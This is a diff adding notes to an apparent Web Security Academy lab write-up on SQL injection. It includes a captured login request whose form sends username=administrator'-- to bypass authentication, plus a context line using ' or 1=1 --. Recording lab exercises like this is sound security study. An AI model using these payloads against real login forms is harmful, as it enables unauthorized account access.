@@ -40,3 +40,25 @@ then use **'  or 1=1 --**  now it shows all product  means the query executed he
 
 # Lab: SQL injection vulnerability allowing login bypass
 
+
+`POST /login HTTP/2`
+`Host: 0aa7008f03eaa71f85d6a4ef008900df.web-security-academy.net`
+`Cookie: session=QE7wOVq0qOUdFqMPKnt2jdgFzMOR1RFC`
+`User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0`
+`Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8`
+`Accept-Language: en-US,en;q=0.5`
+`Accept-Encoding: gzip, deflate, br`
+`Content-Type: application/x-www-form-urlencoded`
+`Content-Length: 81`
+`Origin: https://0aa7008f03eaa71f85d6a4ef008900df.web-security-academy.net`
+`Referer: https://0aa7008f03eaa71f85d6a4ef008900df.web-security-academy.net/login`
+`Upgrade-Insecure-Requests: 1`
+`Sec-Fetch-Dest: document`
+`Sec-Fetch-Mode: navigate`
+`Sec-Fetch-Site: same-origin`
+`Sec-Fetch-User: ?1`
+`Priority: u=0, i`
+`Te: trailers`
+
+`csrf=8ePpuDgiMTtIpvIa5QFCXEvVy8eY4ZZb&username=administrator%27--&password=%27%27`
+
